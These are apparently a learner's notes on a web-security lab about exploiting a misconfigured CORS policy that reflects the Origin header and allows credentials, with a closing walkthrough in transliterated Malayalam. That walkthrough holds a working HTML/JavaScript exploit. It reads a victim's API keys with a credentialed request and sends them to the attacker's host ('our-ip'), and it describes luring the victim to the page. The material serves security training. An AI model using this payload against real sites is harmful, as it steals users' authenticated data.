## Introduction
-->This exercise covers Cross-Origin Resource Sharing and how it can be used to get access to sensitive data.
-->This course details the exploitation of a misconfigured Cross-Origin Resource Sharing (CORS) policy.
-->When misconfigured, CORS can be used to retrieve information from an API call.

# Cross-Origin Resource Sharing
## Introduction
-->One of the key security mechanism used by browsers is the Same-Origin Policy (SOP). Amongst other things, it prevents:
-   JavaScript on Site A from reading the cookies of Site B.
-   JavaScript on Site A from reading the content of Site B.
-->However, developers often want to bypass this mechanism, for example, to get access to `api.ptl.io` from `ptl.io`.
-->Historically, the most common method was to use JSONP (JSON with Padding).
-->Site A will make a request to Site B by loading a script:
```js
<script type="application/javascript" src="http://sitea/script.js?callback=mymethod" ></script>
```
And Site B will answer with:
```scss
mymethod([DATA]);
```
-->Where `[DATA]` contains the data that site B wants to share with site A.
-->The problem with this approach is that site A needs to fully trust site B as it will run arbitrary JavaScript. To limit the impact of a malicious or compromised site B, site A can use CORS.
-->CORS will use HTTP headers to allow or deny a request. The browser will send a request with an `Origin` header and the server can decide whether it allows this request. The server can allow the browser to make CORS request by responding with the header `Access-Control-Allow-Origin:` and a list of hostnames. By default, the browser will send unauthenticated requests unless the server told it not to using `Access-Control-Allow-Credentials: true`.

## Access-Control-Allow-Origin: *
-->A key point of focus when reviewing CORS policy, is the use of a wildcard:
```http
	HTTP/1.1 200 OK
	[...]
	Access-Control-Allow-Origin: *
	[...]
```
-->However, this will only allow an attacker to get a victim to do unauthenticated calls to the vulnerable site (unless another vulnerability in the browser is used).
-->When using the `Access-Control-Allow-Origin: *` even with `Access-Control-Allow-Credentials`, the browser will never send the credentials of the current user.
-->Unfortunately, CORS does not allow an application to use a wildcard like `*.ptl.io` and the developer/administrator will need to manually maintain a white-list of hostnames or add some logic inside the application/server.

## Recopy of the `Origin` header
-->To avoid using the wildcard or maintaining a white-list of websites, some implementations copy the `Origin` header from the request back in the response. Here we can see that a random value for the `Origin` header is available in the `Access-Control-Allow-Origin` response:
```bash
-> echo -ne "HEAD / HTTP/1.1\r\nHost: vulnerable\r\nOrigin: randomvaluethatisnotvalid\r\n\r\n" | nc vulnerable 80
	HTTP/1.1 200 OK
	Date: Sun, 08 Nov 2015 21:40:29 GMT
	Server: Apache/2.2.21 (Unix) DAV/2 PHP/5.4.3
	X-Powered-By: PHP/5.4.3
	Set-Cookie: PHPSESSID=fqb92hmpd98h06iceh6rjfb8j2; path=*p>
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
	Pragma: no-cache
	Access-Control-Allow-Origin: randomvaluethatisnotvalid
	Access-Control-Allow-Credentials: true
	Access-Control-Allow-Methods: POST, PUT, DELETE, GET, OPTIONS
	Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
	Content-Type: text/html
```
-->Combined with `Access-Control-Allow-Credentials: true`, this allows an attacker to trick a user visiting his website into doing Cross-Origin request and read the content of the response.

## Gaining access to data from an API call
-->Since the API calls rely on cookies to authenticate users (as opposed to using a dedicated header that will prevent this attack). You are able to create a malicious HTML page and get the victim to visit it.
-->Due to the weak CORS policy, we can get a victim visiting our website to send requests to the vulnerable website and read the response.
-->Your malicious page should perform the attack in two phases:
-   Get the victim to load the main page and retrieve the keys from the API, by first using `XMLHttpRequest()` and setting `.withCredentials` to `true`.
-   Get the victim to send the data from the API call to your server using another `XMLHttpRequest()` or another way to leak information to your server.

## Conclusion
-->This exercise showed you how to manually detect weak CORS policy and how this can be used to retrieve data from an API by tricking a victim to visit a malicious page.
-->CORS is more and more widely deployed by companies as it allows them to use content and API from multiple websites.
-->If you are testing an API or website, make sure you test for this issue.

# Video Explanation
-->lab open chyuka.enit oru account aakuka
-->namude account il keys enn oru link undakum.so athilek poyal namuk keys kanan patum
-->ini ee request eduth repeater il iduka.enit athile origin: header il entheniglum koduth send chyumbol namuk kanam ath reflect chyunun.do origin correct check chyunila site
-->so namal namude website il ninum ee page ilek request ayachalum application accept chyum angane matoralude keys namuk edukan patum ok
```html
<html>
<body>
<script>
var xhr=new XMLHttpRequest();
xhr.open("POST","http://ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys",false);
xhr.withCredentials =true;
xhr.send();
var a=xhr.responseText;

var xhr2=new XMLHttpRequest();
xhr2.open("GET","http://our-ip/"+a,false);
xhr2.withCredentials =true;
xhr2.send();
</script>
</body>
</html>
```
-->ivide namal request method um url um koduthathin shesham false kodukunath enthinanenal namal oro request um symmetric aayi aan send chyunaht.so anagne send chyumbol false enn kodukanam.apol namuk oro request um individual aayi send chyan patum ok
-->so ee html oru html file il aaki.namal terminalil python vech webserver aakuka.enit namal ee url victim in koduthal ayalude key namuk terminalil kanan patum ok
